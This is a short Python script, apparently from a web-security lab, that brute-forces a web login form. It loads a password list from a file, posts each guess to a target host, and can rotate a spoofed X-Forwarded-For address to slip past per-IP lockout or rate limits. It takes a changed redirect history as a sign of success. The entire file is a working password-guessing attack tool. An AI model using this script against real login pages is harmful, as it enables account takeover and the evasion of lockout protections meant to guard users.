import requests
import re

sessionValue=" "
host=" "
passlist=""


def guess_pass(validlogin,password,supportXforward=False,nr=1):
    cookie={'session':sessionValue}
    payload = {'username':validlogin,'password':password}
    hed={'X-Forwarded-For':'192.168.53.'+str(nr)}
    try:
        if supportXforward:
            response = requests.post(host ,data=payload,headers=hed)
        else:
            response = requests.post(host ,data=payload)

    except Exception as e:
        print(e)
    #or check 
    #res_status = response.status_code
    res_status = response.history
    return res_status
 
 
def open_passlist_file(filepath):
    file=open(filepath,'r')
    lists=file.readlines()
    words=[]
    for i in range(len(lists)):
        words.append(lists[i].rstrip('\n').split(',')[0])        
    return words

try:
    filepath=input("Enter a filepath: ")
    passlist=open_passlist_file(filepath)
except Exception as e:
        print(e)


def brutepass(validlog="dupa",supportXforward=False):
    response_stat=guess_pass(validlog,"napewnozlypass",supportXforward)
    tryNr=1
    for word in passlist:
        tryNr+=1
        new_status=guess_pass(validlog,word,supportXforward,tryNr)
        print("TRY NR: "+str(tryNr)+" pass: "+str(word)+" =  "+str(new_status))
        if response_stat!=new_status:
            print("valid password can be: "+word)
            break


vallogin=input("Enter a valid login: ")
supportXforward=int(input("Do web support-X-forward[1/0]: "))

if supportXforward==1:
    supportXforward=True
else:
    supportXforward=False

brutepass(vallogin,supportXforward)
